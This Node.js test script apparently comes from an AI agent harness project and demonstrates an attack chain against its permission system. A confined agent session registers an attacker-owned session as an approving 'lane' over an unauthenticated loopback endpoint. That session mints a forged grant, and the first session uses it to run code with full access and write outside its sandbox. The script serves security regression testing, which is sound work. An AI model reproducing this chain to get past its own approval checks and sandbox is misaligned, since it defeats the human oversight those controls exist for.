#!/usr/bin/env node
/**
 * run-a5ptc4c-chainred.mjs — F-L2-1 RED-FIRST: pin the FULL attack chain on the
 * reviewed L2 row AS IT SHIPS (a5ptc4b-grantrow.mjs, byte-identical). This is
 * the danger proof, not a governance test: member → unauthenticated loopback
 * lane registration → forged Grant mint → consumption (the forbidden-zone write
 * really lands). If every criterion PASSES, the chain is real (that is the
 * point of this round). The GREEN closure (run-a5ptc4c-l2close.mjs) must refuse
 * every one of these same steps against the closure row.
 *
 * Attacker model (root 10:38Z): an ADVERSARIAL Team member M1 whose model
 * follows the attack itself. The drive-path the attacker legitimately owns:
 *  - M1 runs confined outer programs (workspace-write, NO escalation) — the
 *    reviewer already proved the provision face is reachable from inside them;
 *  - ATK = a second session the attacker owns outright (the attacker drives
 *    its OWN session through the host's authenticated API — no stolen
 *    credentials anywhere in this chain; the exploit is purely the
 *    unauthenticated provision face + host-field-free declared bindings).
 *
 * Steps:
 *  REDCHAIN-0  M1 asks honestly (leg HIJACK, callId pinned) — with NO honest
 *              lane provisioned at all, nobody may answer; baseline zero-write.
 *              (Then we do the attack.)
 *  REDCHAIN-1  confined child of M1 POSTs /__a5ptc4b/provision {ATK, lane} →
 *              ACCEPTED (200 ok role:lane); roster census shows ATK with the
 *              three lane tools; ledger shows provision-complete.
 *  REDCHAIN-2  attacker drives ATK's OWN lane tools: a5ptc4b_grant declared
 *              M1|callId|run_code|danger-full-access allow → GRANT MINTED
 *              (via=team-lane-tool, issuerLane=ATK).
 *  REDCHAIN-3  M1 presents the bound quadruple → allowed-once → the forbidden
 *              write LANDS. Governance fully bypassed by the member itself.
 *
 * Port 3184 (self-proven free); world tests/homes/a5ptc4c-chainred-* (deleted
 * at teardown unless --keep); :3080 only probed; pinned host tree read-only.
 */
import { spawn, spawnSync } from 'node:child_process'
import { createHash, randomUUID } from 'node:crypto'
import { createServer } from 'node:net'
import { existsSync, mkdirSync, openSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync, copyFileSync } from 'node:fs'
import { basename, dirname, join, resolve } from 'node:path'
import { pathToFileURL } from 'node:url'

import { startMockModel } from '../../../../../packages/tools/harness/mock-deepseek.mjs'
import { TEST_USE_BASELINE_SHA, CLIENT_COMMIT_HASH } from '../../../../../tests/paths.mjs'

const args = process.argv.slice(2)
const argValue = (n, d) => { const i = args.indexOf(`--${n}`); return i === -1 ? d : args[i + 1] }
const KEEP = args.includes('--keep')
const HERE = dirname(new URL(import.meta.url).pathname)
const WORKTREE = resolve(argValue('worktree', resolve(HERE, '..', '..', '..', '..', '..')))
const RUN_STAMP = new Date().toISOString().slice(0, 19).replace(/:/g, '-') + 'Z'
const RUN = `a5ptc4c-chainred-${RUN_STAMP}`
const EVIDENCE_DIR = resolve(join(HERE, 'runs', RUN))
mkdirSync(EVIDENCE_DIR, { recursive: true })

const HOST_PORT = Number(argValue('port', 3184))
const TESTUSE = resolve(argValue('testuse', '/srv/workspace/dsh-plugins/dsh-agent-team/.worktrees/dsh-020rc2-upgrade/tests/deepseek-harness-test-use'))
const LAUNCHER = resolve(argValue('launcher', '/srv/workspace/dsh-plugins/dsh-agent-team/tests/deepseek-harness-test-use/native/system/packages/linux-x64/bin/landlock-run'))
const HOST_BIN = join(TESTUSE, 'apps', 'cli', 'lib', 'bin.js')
// THE REVIEWED ROW, UNMODIFIED — the face under review is exactly what shipped.
const ROW_PATH = join(HERE, 'a5ptc4b-grantrow.mjs')
const HOME = join(WORKTREE, 'tests', 'homes', RUN)
const WS = join(HOME, 'ws')
const FORB = join(WORKTREE, 'tests', 'homes', `${RUN}-forb`)
const SECRET = join(FORB, 'secret.txt')
const LEDGER = join(EVIDENCE_DIR, 'assembly-ledger.jsonl')
const INSTANCE_RAW = join(EVIDENCE_DIR, 'instance.raw.log')
const INSTANCE_LOG = join(EVIDENCE_DIR, 'instance.log')
const ASK_TTL_MS = Number(argValue('ask-ttl', 8000))
const HIJACK_TARGET = join(FORB, 'l-hijack.txt')

const REDACTIONS = [
  [/(https?:\/\/[^\s"'`]+?\?token=)([A-Za-z0-9_-]{8,})/g, (_m, head, tok) => head + `<REDACTED-${createHash('sha256').update(tok).digest('hex').slice(0, 8)}>`],
  [/\b(token|api_key|apikey|access_token)=["']?[A-Za-z0-9_\-.=]{8,}/gi, (m0) => m0.split('=')[0] + '=<REDACTED>'],
  [/dsh-auth-[A-Za-z0-9_-]{6,}/g, 'dsh-auth-<REDACTED>'],
]
const redact = (t) => REDACTIONS.reduce((x, [re, r]) => x.replace(re, r), t)

const CRITERIA = []
const check = (id, claim, cond, observed) => {
  CRITERIA.push({ id, claim, pass: cond === true })
  console.log(`${cond === true ? 'PASS' : 'FAIL'} ${id} — ${claim}`)
  if (observed !== undefined) console.log(`     observed: ${typeof observed === 'string' ? observed.slice(0, 700) : JSON.stringify(observed ?? null).slice(0, 700)}`)
  return cond === true
}
const die = (msg) => { throw new Error(`FATAL: ${msg}`) }
const portFree = (port) => new Promise((res) => { const s = createServer(); s.once('error', () => res(false)); s.once('listening', () => s.close(() => res(true))); s.listen(port, '127.0.0.1') })
const gitAt = (dir, ...a) => spawnSync('git', ['-C', dir, ...a], { encoding: 'utf8' }).stdout.trim()
const sha256 = (buf) => createHash('sha256').update(buf).digest('hex')
const stableProbe = async () => { try { const r = await fetch('http://127.0.0.1:3080/', { redirect: 'manual', signal: AbortSignal.timeout(5000) }); return r.status } catch { return 'unreachable' } }
const readIfExists = (p) => { try { return readFileSync(p, 'utf8') } catch { return null } }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

let host = null
let mock = null
let stableBefore = null
const writeEvidence = (name, value) => writeFileSync(join(EVIDENCE_DIR, name), typeof value === 'string' ? value : JSON.stringify(value, null, 2) + '\n')
async function finalize(status) {
  try { host?.child?.kill() } catch { /* gone */ }
  try { await mock?.close?.() } catch { /* gone */ }
  await new Promise((r) => setTimeout(r, 400))
  try { writeFileSync(INSTANCE_LOG, redact(readFileSync(INSTANCE_RAW, 'utf8'))); rmSync(INSTANCE_RAW) } catch { /* no log */ }
  try {
    const copies = []
    const walk = (dir) => {
      for (const e of readdirSync(dir, { withFileTypes: true })) {
        const p = join(dir, e.name)
        if (e.isDirectory()) walk(p)
        else if (e.isFile() && /^session\..*\.jsonl(\.zstd)?$/.test(e.name) && statSync(p).size < 8_000_000) {
          mkdirSync(join(EVIDENCE_DIR, 'session-logs'), { recursive: true })
          const dest = join(EVIDENCE_DIR, 'session-logs', `${basename(dirname(p))}__${e.name}`)
          copyFileSync(p, dest)
          copies.push(dest.replace(`${EVIDENCE_DIR}/`, ''))
          try {
            const dec = spawnSync('zstd', ['-d', '-c', p], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 })
            if (Number(dec.status) === 0) writeFileSync(`${dest}.redacted.txt`, redact(String(dec.stdout ?? '')))
          } catch { /* decode best-effort */ }
        }
      }
    }
    if (existsSync(HOME)) walk(HOME)
    if (copies.length > 0) writeEvidence('session-logs-copied.json', copies)
  } catch { /* diagnostics only */ }
  if (!KEEP) {
    try { rmSync(HOME, { recursive: true, force: true }) } catch { /* best effort */ }
    try { rmSync(FORB, { recursive: true, force: true }) } catch { /* best effort */ }
  }
  writeEvidence('criteria.json', { run: RUN, mode: 'chain-red', askTtlMs: ASK_TTL_MS, status, criteria: CRITERIA })
}
const BOOT_MARKER = /dsh web: http:\/\/127\.0\.0\.1:(\d+)\/\?token=([A-Za-z0-9_-]+)/
async function waitFor(deadlineMs, fn, what) {
  const deadline = Date.now() + deadlineMs
  for (;;) {
    const v = await fn()
    if (v !== null && v !== undefined && v !== false) return v
    if (Date.now() >= deadline) die(`timeout waiting for ${what}`)
    await new Promise((r) => setTimeout(r, 200))
  }
}
async function pollUntil(deadlineMs, fn, what) {
  const deadline = Date.now() + deadlineMs
  for (;;) {
    const v = await fn()
    if (v !== null && v !== undefined && v !== false) return v
    if (Date.now() >= deadline) return { __held: what }
    await new Promise((r) => setTimeout(r, 200))
  }
}
async function fetchJson(url, init, timeoutMs = 120_000) {
  const res = await fetch(url, { ...(init ?? {}), signal: AbortSignal.timeout(timeoutMs) })
  const text = await res.text()
  try { return { status: res.status, body: JSON.parse(text) } } catch { return { status: res.status, body: text } }
}

const MK = RUN.replace(/[^A-Za-z0-9]/g, '').toUpperCase()
const HIJACK_CALL = `call-${MK}-HIJACK`

// ── attacker programs (confined, workspace-write: NO escalation) ────────────
const attackerRegProgram = (atkSid) => [
  "const fs = await import('node:fs');",
  'const pid = process.pid;',
  `const base = 'http://127.0.0.1:${HOST_PORT}';`,
  'const out = { pid };',
  'try {',
  `  const r = await fetch(base + '/__a5ptc4b/provision', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sessionId: ${JSON.stringify(atkSid)}, role: 'lane' }) });`,
  '  out.regStatus = r.status;',
  '  out.regBody = String(await r.text()).slice(0, 400);',
  '} catch (e) { out.regError = String(e).slice(0, 200) }',
  'try {',
  "  const r2 = await fetch(base + '/__a5ptc4b/roster');",
  '  out.rosterStatus = r2.status;',
  `  const j = await r2.json();`,
  "  out.lanes = (j.rows ?? []).filter((x) => x.role === 'lane').map((x) => ({ label: String(x.label).slice(-8), laneTools: x.laneTools }))",
  '} catch (e) { out.rosterError = String(e).slice(0, 200) }',
  `fs.writeFileSync(${JSON.stringify(join(WS, 'chain-reg-result.json'))}, JSON.stringify(out));`,
  'return out;',
].join('\n')

const escHijackProgram = () => [
  "const fs = await import('node:fs');",
  'const pid = process.pid;',
  'const w = await tools.a5ptc4b_echo({ tag: \'HIJACK-body\' });',
  'let writeCode = \'none\';',
  `try { fs.writeFileSync(${JSON.stringify(HIJACK_TARGET)}, 'A5PTC4B-HIJACK-RAN-' + pid); } catch (e) { writeCode = String(e.code); }`,
  'return { pid, echo: w, writeCode, canary: \'A5PTC4B-HIJACK-RAN\' };',
].join('\n')

async function main() {
  stableBefore = await stableProbe()
  console.log(`stable-instance :3080 probe (pre) = ${stableBefore}`)
  if (!(await portFree(HOST_PORT))) die(`port ${HOST_PORT} busy`)
  const pinnedHead = gitAt(TESTUSE, 'rev-parse', 'HEAD')
  const porcelain0 = gitAt(TESTUSE, 'status', '--porcelain') === ''
  check('P-PIN', `pinned host tree @${TEST_USE_BASELINE_SHA.slice(0, 10)} with porcelain=0`, pinnedHead === TEST_USE_BASELINE_SHA && porcelain0, `head=${pinnedHead.slice(0, 12)} porcelain=${porcelain0}`)

  const rowSha = sha256(readFileSync(ROW_PATH))
  const shippedBuf = spawnSync('git', ['-C', WORKTREE, 'show', 'e80ca6eb:dev/agent-workflow/evidence/alpha5/w-ptc-outerfs/a5ptc4b-grantrow.mjs'], { maxBuffer: 64 * 1024 * 1024 }).stdout ?? Buffer.from('')
  const shippedSha = shippedBuf.length > 0 ? sha256(shippedBuf) : ''
  check('P-REVIEWED-ROW-UNMODIFIED', 'the attack runs against the REVIEWED L2 row byte-for-byte as shipped at e80ca6eb (no closure code involved)',
    rowSha === shippedSha && rowSha.length === 64, `sha256=${rowSha.slice(0, 16)} shipped=${shippedSha.slice(0, 16)}`)

  mkdirSync(WS, { recursive: true })
  mkdirSync(FORB, { recursive: true })
  writeFileSync(SECRET, `A5PTC4C-CHAINRED-${RUN_STAMP}\n`)
  const probeRun = spawnSync(LAUNCHER, ['--probe'], { encoding: 'utf8', timeout: 4000 })
  check('P-OS-PREFLIGHT', 'OS floor up (the escalation that lands at REDCHAIN-3 rides the REAL confine() path; the write is a real OS-level escape, not a fiction)',
    probeRun.status === 0, `probe-exit=${probeRun.status}`)

  mkdirSync(join(HOME, 'profiles', 'web'), { recursive: true })
  writeFileSync(join(HOME, 'profiles', 'web', 'cordis.patch.yml'), [
    `# a5ptc4c F-L2-1 RED chain (run ${RUN}): the REVIEWED row only, unmodified — the face under review is exactly what shipped.`,
    '- insert:',
    '    - id: a5ptc4b-grantrow',
    `      name: ${JSON.stringify(pathToFileURL(ROW_PATH).href)}`,
    '      config: {}',
    '',
  ].join('\n'))

  let laneTurns = 0
  let reqs = 0
  mock = await startMockModel({
    port: 0,
    decide: ({ req }) => {
      reqs += 1
      if (reqs > 80) return { kind: 'text', content: `${MK}_FUSED fuse at ${reqs}` }
      const body = req?.body ?? req ?? {}
      const msgs = body.messages ?? []
      const users = msgs.filter((m) => m?.role === 'user')
      const last = users[users.length - 1]
      const lastText = typeof last?.content === 'string' ? last.content : JSON.stringify(last?.content ?? '')
      // ATK (attacker-owned session): its OWN tool call mints the forged grant
      const atk = /A5PTC4C_ATK_GRANT\s+(\S+)/.exec(lastText)
      if (atk !== null) {
        const idx = msgs.indexOf(last)
        const done = msgs.slice(idx + 1).flatMap((m) => Array.isArray(m?.content) ? m.content.filter((b) => b?.type === 'tool_result') : [])
        if (done.length > 0) {
          const t = done.map((b) => { const c = b.content; return typeof c === 'string' ? c : Array.isArray(c) ? c.map((x) => x?.text ?? '').join('') : JSON.stringify(c ?? '') }).join(' | ')
          writeEvidence('atk-mint-toolresult.json', { at: new Date().toISOString(), toolResult: t.slice(0, 900) })
          return { kind: 'text', content: `A5PTC4C_ATK_DONE ${t.slice(0, 500)}` }
        }
        return { kind: 'tool-call', toolCalls: [{ id: `atk-${MK}-mint`, name: 'a5ptc4b_grant', arguments: { declared: atk[1].trim(), decision: 'allow', ttl_ms: 60000 } }] }
      }
      const hit = ['REG', 'HIJACK'].find((l) => lastText.includes(`${MK}_${l} `) || lastText.endsWith(`${MK}_${l}`))
      if (hit == null) return lastText.includes(`${MK}_SET`) ? { kind: 'text', content: `${MK}_SET_OK` } : { kind: 'text', content: 'a5ptc4c-chainred-mock: quiet.' }
      const idx = msgs.indexOf(last)
      const results = msgs.slice(idx + 1).flatMap((m) => Array.isArray(m?.content) ? m.content.filter((b) => b?.type === 'tool_result') : [])
      if (results.length > 0) {
        const t = results.map((b) => { const c = b.content; return typeof c === 'string' ? c : Array.isArray(c) ? c.map((x) => x?.text ?? '').join('') : JSON.stringify(c ?? '') }).join(' | ')
        return { kind: 'text', content: `${MK}_DONE_${hit} ${t.slice(0, 900)}` }
      }
      if (hit === 'REG') {
        return { kind: 'tool-call', toolCalls: [{ id: `call-${MK}-REG`, name: 'run_code', arguments: { code: attackerRegProgram(S.ATK), description: 'a5ptc4c CHAINRED: confined child registers ATK as lane over loopback (no escalation)' } }] }
      }
      return {
        kind: 'tool-call',
        toolCalls: [{
          id: HIJACK_CALL,
          name: 'run_code',
          arguments: {
            code: escHijackProgram(),
            description: 'a5ptc4c HIJACK: forbidden-zone write under a grant the member minted for itself',
            sandbox_permissions: 'danger-full-access',
            justification: 'a5ptc4c HIJACK: consumer leg of the attack chain',
          },
        }],
      }
    },
  })

  const outFd = openSync(INSTANCE_RAW, 'a')
  const child = spawn(process.execPath, [HOST_BIN, 'web', '--port', String(HOST_PORT), '--no-open'], {
    cwd: TESTUSE,
    stdio: ['ignore', outFd, outFd],
    env: {
      ...process.env,
      DSH_HOME: HOME,
      DSH_CLIENT_COMMIT_HASH: CLIENT_COMMIT_HASH,
      DEEPSEEK_BASE_URL: `http://127.0.0.1:${mock.port}`,
      DEEPSEEK_API_KEY: 'a5ptc4c-chainred-mock-key',
      A5PTC4B_ASSEMBLE: '1',
      A5PTC4B_OS: '1',
      A5PTC4B_TESTUSE: TESTUSE,
      A5PTC4B_LEDGER: LEDGER,
      A5PTC4B_LAUNCHER: LAUNCHER,
      A5PTC4B_RUN: RUN,
      A5PTC4B_ASK_TTL_MS: String(ASK_TTL_MS),
    },
  })
  host = { child }
  child.on('exit', (code, signal) => console.log(`host exited code=${String(code)} signal=${String(signal)}`))
  const boot = await waitFor(120_000, () => {
    try { const m = BOOT_MARKER.exec(readFileSync(INSTANCE_RAW, 'utf8')); return m === null ? false : m } catch { return false }
  }, 'host boot marker')
  const origin = `http://127.0.0.1:${boot[1]}`
  const cookie = (await fetch(`${origin}/?token=${boot[2]}`, { redirect: 'manual', signal: AbortSignal.timeout(30_000) })).headers.get('set-cookie')
  check('L-BOOT', `host booted on ${HOST_PORT} with the REVIEWED row applied`,
    cookie !== null && (await fetchJson(`${origin}/__a5ptc4b/health`))?.body?.applied === true, `applied=true`)
  await waitFor(40_000, async () => { const h = await fetchJson(`${origin}/__a5ptc4b/health`).catch(() => null); return h?.status === 200 && h.body.applied === true ? h : false }, 'reviewed row apply')

  const api = (method, payload, timeoutMs = 240_000) => fetchJson(`${origin}/api/session/${method}`, {
    method: 'POST', headers: { 'content-type': 'application/json', cookie: cookie ?? '' },
    body: JSON.stringify({ type: 'client-request', rpcId: `a5ptc4c-${Math.random().toString(36).slice(2, 10)}`, method: `session/${method}`, payload: { args: { request: payload } } }),
  }, timeoutMs)
  const createSession = async () => {
    const r = await api('create', { requestId: `a5ptc4c-c-${Math.random().toString(36).slice(2, 10)}`, cwd: WS }, 90_000)
    return r.body?.result?.value?.sessionId ?? r.body?.value?.sessionId ?? null
  }
  const S = {}
  for (const k of ['M1', 'ATK']) S[k] = await createSession()
  const prompt = (sid, text) => api('prompt', { requestId: `a5ptc4c-r-${Math.random().toString(36).slice(2, 10)}`, sessionId: sid, mode: 'queue', content: [{ type: 'text', text }] }, 240_000)
  for (const k of ['M1', 'ATK']) await prompt(S[k], `${MK}_SET_${k} setup turn; reply OK`)

  const roster = async () => (await fetchJson(`${origin}/__a5ptc4b/roster`)).body
  const jrows = async () => ((await fetchJson(`${origin}/__a5ptc4b/journal`).catch(() => null))?.body?.rows) ?? []
  const grants = async () => ((await fetchJson(`${origin}/__a5ptc4b/grants`).catch(() => null))?.body?.rows) ?? []
  const approvals = async () => ((await fetchJson(`${origin}/__a5ptc4b/approvals`).catch(() => null))?.body?.rows) ?? []
  const state = async () => (await fetchJson(`${origin}/__a5ptc4b/state`)).body?.assemblies ?? {}

  // M1 is an honest rostered member (this part is normal kit provisioning);
  // NO honest lane exists anywhere in this world.
  const provM1 = await waitFor(120_000, async () => { const x = await fetchJson(`${origin}/__a5ptc4b/provision`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sessionId: S.M1, role: 'member' }) }).catch(() => null); return x?.body?.ok === true ? x : false }, 'provision M1')
  const labelM1 = provM1.body.label
  const runsOf = async (label) => (await state())?.[label]?.runs ?? []

  // ── REDCHAIN-0 baseline: honest ask, no lane → nobody answers → zero write ─
  await prompt(S.M1, `${MK}_HIJACK leg HIJACK baseline`)
  const baseline = await pollUntil(ASK_TTL_MS + 4000, async () => {
    const rows = (await approvals()).filter((x) => x.callId === HIJACK_CALL && x.outcome === 'rejected')
    return rows.length > 0 ? rows[rows.length - 1] : false
  }, 'baseline lane-timeout row')
  check('REDCHAIN-0-NO-LANE-ZERO-WRITE', 'baseline (pre-attack): with NO lane provisioned the member\'s escalation gets zero answer (lane-timeout refusal at the deadline) and writes NOTHING — so any later write can only come from the attack',
    baseline?.__held === undefined && baseline?.decision === 'lane-timeout' && baseline?.outcome === 'rejected' && !existsSync(HIJACK_TARGET),
    `row=${JSON.stringify(baseline ?? null).slice(0, 200)} written=${existsSync(HIJACK_TARGET)}`)

  // ── REDCHAIN-1: confined child registers ATK as a minting lane ────────────
  const rosterBefore = (await roster()).rows.length
  await prompt(S.M1, `${MK}_REG leg REG`)
  const regRes = await pollUntil(90_000, async () => { const f = readIfExists(join(WS, 'chain-reg-result.json')); return f === null ? false : JSON.parse(f) }, 'attacker registration result')
  const reg = regRes?.__held ? null : regRes
  const rosterAfter = (await roster()).rows
  const atkEntry = rosterAfter.find((r) => r.role === 'lane')
  const regLedgerRow = (await jrows()).find((x) => x.leg === 'provision-complete' && x.role === 'lane')
  writeEvidence('chain-red-step1.json', { rosterBefore, rosterAfter, reg, regLedgerRow })
  check('REDCHAIN-1-UNAUTH-LANE-REGISTRATION', 'step 1 HOLDS (danger): the member\'s OWN confined workspace-write child — no host credential, no escalation, plain loopback — registered the unrostered ATK session as a MINTING LANE: 200 ok role:lane, roster now carries ATK with the three lane tools, ledger carries provision-complete',
    reg?.regStatus === 200 && /"ok":true/.test(String(reg?.regBody)) && rosterAfter.length === rosterBefore + 1
    && atkEntry !== undefined && Array.isArray(atkEntry?.laneTools) && atkEntry.laneTools.length === 3 && regLedgerRow !== undefined,
    `reg=${JSON.stringify(reg ?? null).slice(0, 400)} lanes=${JSON.stringify(rosterAfter.filter((r) => r.role === 'lane').map((r) => String(r.label).slice(-8)))}`)

  // ── REDCHAIN-2: the attacker drives ATK's OWN lane tools to mint ──────────
  const grantsBefore = (await grants()).length
  await prompt(S.ATK, `A5PTC4C_ATK_GRANT ${labelM1}|${HIJACK_CALL}|run_code|danger-full-access (attacker turn)`)
  const forged = await pollUntil(60_000, async () => { const g = (await grants()).find((x) => x.bind?.callId === HIJACK_CALL); return g === undefined ? false : g }, 'forged grant')
  const gForged = forged?.__held ? null : forged
  writeEvidence('chain-red-step2.json', { grantsBefore, forged: gForged, atkToolResult: readIfExists(join(EVIDENCE_DIR, 'atk-mint-toolresult.json')) })
  check('REDCHAIN-2-FORGED-GRANT-MINTED', 'step 2 HOLDS (danger): the attacker never touches a minting HTTP face — ATK is now a provisioned lane, so its OWN tool call mints a Grant bound to the MEMBER\'s quadruple (the declared form takes agent|callId|toolName|mode as free text: bindings the honest lane could not forge are trivially forgeable once ANY session is a lane)',
    gForged?.via === 'team-lane-tool' && gForged?.source === 'declared' && gForged?.state === 'issued'
    && String(gForged?.issuerLane?.label ?? '') === String(atkEntry?.label ?? '') && gForged?.bind?.agent === labelM1 && gForged?.bind?.callId === HIJACK_CALL,
    `grant=${JSON.stringify(gForged ?? null).slice(0, 400)}`)

  // ── REDCHAIN-3: the member spends its own forged grant ────────────────────
  const beforeRun = (await runsOf(labelM1)).length
  await prompt(S.M1, `${MK}_HIJACK leg HIJACK spend`)
  const spend = await pollUntil(90_000, async () => {
    const row = (await approvals()).filter((x) => x.callId === HIJACK_CALL).at(-1)
    return row?.outcome === 'allowed-once' && existsSync(HIJACK_TARGET) ? row : false
  }, 'spend leg (allowed-once + write landed)')
  const spendRow = (await approvals()).filter((x) => x.callId === HIJACK_CALL).at(-1)
  await sleep(600)
  const hijackWritten = existsSync(HIJACK_TARGET)
  const secret = readIfExists(SECRET)
  writeEvidence('chain-red-step3.json', { spendRow, hijackWritten, hijackContent: readIfExists(HIJACK_TARGET), spend: spend?.__held ? null : spend })
  check('REDCHAIN-3-CONSUMPTION-LANDED', 'step 3 HOLDS (danger fully realized): the member spent its SELF-MINTED grant — decision=lane-allow outcome=allowed-once carrying the FORGED grantId, and the forbidden-zone file really exists on disk (a real confined-OS escape, escalation the Team never approved). Chain = member → loopback registration → mint → consumption, end to end, no honest lane, no stolen credential',
    spendRow?.outcome === 'allowed-once' && spendRow?.grantId !== undefined && hijackWritten
    && String(readIfExists(HIJACK_TARGET) ?? '').includes('A5PTC4B-HIJACK-RAN') && secret !== null && !secret.includes('HIJACK'),
    `askRow=${JSON.stringify(spendRow ?? null).slice(0, 300)} written=${hijackWritten}`)

  const stableAfter = await stableProbe()
  check('P-STABLE-UNTOUCHED', `:3080 stable instance untouched (pre=${stableBefore} post=${stableAfter}); this kit bound only ${HOST_PORT}`,
    stableBefore === stableAfter && stableBefore === 401, `pre=${stableBefore} post=${stableAfter}`)
  const pinnedHeadPost = gitAt(TESTUSE, 'rev-parse', 'HEAD')
  check('P-PRISTINE-POST', 'pinned host tree byte-clean after the run (HEAD unchanged, porcelain empty)',
    pinnedHeadPost === TEST_USE_BASELINE_SHA && gitAt(TESTUSE, 'status', '--porcelain') === '', `head=${pinnedHeadPost.slice(0, 12)}`)

  const passCount = CRITERIA.filter((c) => c.pass).length
  const chainIds = ['REDCHAIN-0-NO-LANE-ZERO-WRITE', 'REDCHAIN-1-UNAUTH-LANE-REGISTRATION', 'REDCHAIN-2-FORGED-GRANT-MINTED', 'REDCHAIN-3-CONSUMPTION-LANDED']
  const chainOk = chainIds.every((id) => CRITERIA.some((c) => c.id === id && c.pass))
  console.log(`\n[CHAIN-RED] criteria: ${passCount}/${CRITERIA.length} pass; attack-chain complete = ${chainOk}`)
  console.log(chainOk
    ? '[CHAIN-RED] verdict: RED-CHAIN-COMPLETE — the F-L2-1 danger is REAL end-to-end (this is the expected outcome of the pre-fix round); the closure must refuse every step.'
    : '[CHAIN-RED] verdict: CHAIN-INCOMPLETE — the pre-fix chain did NOT fully connect; re-examine before claiming the fix matters.')
  await finalize(chainOk ? 'RED-CHAIN-COMPLETE' : 'CHAIN-INCOMPLETE')
  process.exit(chainOk ? 0 : 2)
}

main().catch(async (error) => {
  console.error(String(error?.stack ?? error))
  try { writeEvidence('fatal.json', { message: String(error?.message ?? error), criteriaSoFar: CRITERIA }) } catch { /* last resort */ }
  await finalize('FATAL')
  process.exit(1)
})
